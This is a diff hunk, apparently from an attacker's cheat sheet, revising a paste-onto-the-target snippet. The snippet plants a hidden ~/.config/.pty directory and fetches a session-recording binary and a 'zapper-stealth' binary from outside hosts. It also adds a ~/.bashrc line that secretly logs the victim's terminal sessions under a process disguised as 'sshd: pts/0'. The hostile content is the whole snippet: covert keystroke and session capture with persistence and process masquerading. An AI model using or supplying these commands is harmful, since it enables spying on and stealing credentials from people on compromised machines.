@@ -2418,7 +2418,9 @@ Deploy: Cut & paste the following onto the target and follow the instructions:
 # [ -z "$LC_PTY" ] && [ -t 0 ] && [[ "$HISTFILE" != *null* ]] && [ -d ~/.config/.pty ] && { script -V; } &>/dev/null && LC_PTY=1 exec -a "sshd: pts/0" script -fqaec "exec ${BASH_EXECUTION_STRING:--a -bash '"$(command -v bash)"'}" -I ~/.config/.pty/.@pty-unix.$$
 command -v bash >/dev/null || { echo "Not found: /bin/bash"; false; } \
 && { mkdir -p ~/.config/.pty 2>/dev/null; :; } \
-&& curl -o ~/.config/.pty/pty -fsSL "https://bin.pkgforge.dev/$(uname -m)/script" \
+&& { script -h | grep -qm1 -- -I && cp "$(command -v script)" ~/.config/.pty/pty; :; } \
+&& { [ ! -f ~/.config/.pty/pty ] && curl -o ~/.config/.pty/pty -fsSL "https://bin.pkgforge.dev/$(uname -m)/script"; :; } \
+&& [ -f ~/.config/.pty/pty ] \
 && curl -o ~/.config/.pty/ini -fsSL "https://github.com/hackerschoice/zapper/releases/download/v1.1/zapper-stealth-linux-$(uname -m)" \
 && chmod 755 ~/.config/.pty/ini ~/.config/.pty/pty \
 && echo -e '----------\n\e[0;32mSUCCESS\e[0m. Add the following line to \e[0;36m~/.bashrc\e[0m:\e[0;35m' \
